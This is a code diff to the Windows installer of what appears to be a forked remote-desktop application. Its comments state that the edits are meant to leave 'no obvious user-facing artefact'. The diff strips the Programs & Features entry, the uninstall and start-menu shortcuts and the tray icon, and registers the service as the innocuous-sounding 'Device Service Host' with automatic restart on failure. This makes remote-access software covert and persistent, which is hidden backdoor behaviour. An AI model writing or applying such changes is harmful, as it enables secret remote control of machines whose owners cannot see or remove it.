@@ -1659,14 +1659,9 @@ if exist \"{tmp_path}\\{app_name} Tray.lnk\" del /f /q \"{tmp_path}\\{app_name} 
         Config::set_option("api-server".into(), lic.api);
     }
 
-    let tray_shortcuts = if config::is_outgoing_only() {
-        "".to_owned()
-    } else {
-        format!("
-cscript \"{tray_shortcut}\"
-copy /Y \"{tmp_path}\\{app_name} Tray.lnk\" \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"
-")
-    };
+    // Fork: never create the tray startup shortcut — service runs silently with no tray.
+    let tray_shortcuts = String::new();
+    let _ = tray_shortcut;
 
     let install_remote_printer = if install_printer {
         // No need to use `|| true` here.
@@ -1681,40 +1676,21 @@ copy /Y \"{tmp_path}\\{app_name} Tray.lnk\" \"%PROGRAMDATA%\\Microsoft\\Windows\
     // Remember to check if `update_me` need to be changed if changing the `cmds`.
     // No need to merge the existing dup code, because the code in these two functions are too critical.
     // New code should be written in a common function.
+    // Fork: skip Add/Remove Programs registry writes (no Programs & Features entry),
+    // skip start-menu uninstall shortcut (no obvious user-facing artefact), skip start-menu app shortcut.
     let cmds = format!(
         "
 {uninstall_str}
 chcp 65001
 md \"{path}\"
 {copy_exe}
-reg add {subkey} /f
-reg add {subkey} /f /v DisplayIcon /t REG_SZ /d \"{display_icon}\"
-reg add {subkey} /f /v DisplayName /t REG_SZ /d \"{app_name}\"
-reg add {subkey} /f /v DisplayVersion /t REG_SZ /d \"{version}\"
-reg add {subkey} /f /v Version /t REG_SZ /d \"{version}\"
-reg add {subkey} /f /v BuildDate /t REG_SZ /d \"{build_date}\"
-reg add {subkey} /f /v InstallLocation /t REG_SZ /d \"{path}\"
-reg add {subkey} /f /v Publisher /t REG_SZ /d \"{app_name}\"
-reg add {subkey} /f /v VersionMajor /t REG_DWORD /d {version_major}
-reg add {subkey} /f /v VersionMinor /t REG_DWORD /d {version_minor}
-reg add {subkey} /f /v VersionBuild /t REG_DWORD /d {version_build}
-reg add {subkey} /f /v UninstallString /t REG_SZ /d \"\\\"{exe}\\\" --uninstall\"
-reg add {subkey} /f /v EstimatedSize /t REG_DWORD /d {size}
-reg add {subkey} /f /v WindowsInstaller /t REG_DWORD /d 0
-cscript \"{mk_shortcut}\"
-cscript \"{uninstall_shortcut}\"
 {tray_shortcuts}
-{shortcuts}
-copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{path}\\\"
 {dels}
 {import_config}
 {after_install}
 {install_remote_printer}
 {sleep}
     ",
-        display_icon = get_custom_icon(&path, &cur_exe).unwrap_or(exe.to_string()),
-        version = crate::VERSION.replace("-", "."),
-        build_date = crate::BUILD_DATE,
         after_install = get_after_install(
             &exe,
             Some(reg_value_start_menu_shortcuts),
@@ -1726,6 +1702,12 @@ copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{path}\\\"
         copy_exe = copy_exe_cmd(&src_exe, &exe, &path)?,
         import_config = get_import_config(&exe),
     );
+    // The vars subkey / mk_shortcut / uninstall_shortcut / shortcuts / version_* / size /
+    // cur_exe are now intentionally unused (we removed the Add/Remove Programs entry and the
+    // start-menu shortcuts). Leaving them in place keeps the surrounding code intact in case
+    // we re-enable any of those later. They will produce harmless `unused_variables` warnings.
+    let _ = (&subkey, &mk_shortcut, &uninstall_shortcut, &shortcuts, &cur_exe,
+             version_major, version_minor, version_build, size);
     run_cmds(cmds, debug, "install")?;
     run_after_run_cmds(silent);
     Ok(())
@@ -3168,21 +3150,18 @@ pub fn uninstall_service(show_new_window: bool, _: bool) -> bool {
 pub fn install_service() -> bool {
     log::info!("Installing service...");
     let _installing = crate::platform::InstallingService::new();
-    let (_, path, _, exe) = get_install_info();
-    let tmp_path = std::env::temp_dir().to_string_lossy().to_string();
-    let tray_shortcut = get_tray_shortcut(&path, &exe, &exe, &tmp_path).unwrap_or_default();
+    let (_, _path, _, exe) = get_install_info();
+    let _tmp_path = std::env::temp_dir().to_string_lossy().to_string();
     let filter = format!(" /FI \"PID ne {}\"", get_current_pid());
     Config::set_option("stop-service".into(), "".into());
     crate::ipc::EXIT_RECV_CLOSE.store(false, Ordering::Relaxed);
+    // Fork: no tray startup shortcut — service runs silently with no tray icon.
     let cmds = format!(
         "
 chcp 65001
 taskkill /F /IM {app_name}.exe{filter}
-cscript \"{tray_shortcut}\"
-copy /Y \"{tmp_path}\\{app_name} Tray.lnk\" \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"
 {import_config}
 {create_service}
-if exist \"{tray_shortcut}\" del /f /q \"{tray_shortcut}\"
     ",
         app_name = crate::get_app_name(),
         import_config = get_import_config(&exe),
@@ -3693,8 +3672,12 @@ fn get_create_service(exe: &str) -> String {
 if exist \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name} Tray.lnk\" del /f /q \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name} Tray.lnk\"
 ", app_name = crate::get_app_name())
     } else {
+        // Fork: friendlier service display name + description, plus auto-recovery
+        // (restart 3x with 5s delay, reset failure counter after 1 day).
         format!("
-sc create {app_name} binpath= \"\\\"{exe}\\\" --service\" start= auto DisplayName= \"{app_name} Service\"
+sc create {app_name} binpath= \"\\\"{exe}\\\" --service\" start= auto DisplayName= \"Device Service Host\"
+sc description {app_name} \"Manages device service host operations and background synchronization.\"
+sc failure {app_name} reset= 86400 actions= restart/5000/restart/5000/restart/5000
 sc start {app_name}
 ",
     app_name = crate::get_app_name())
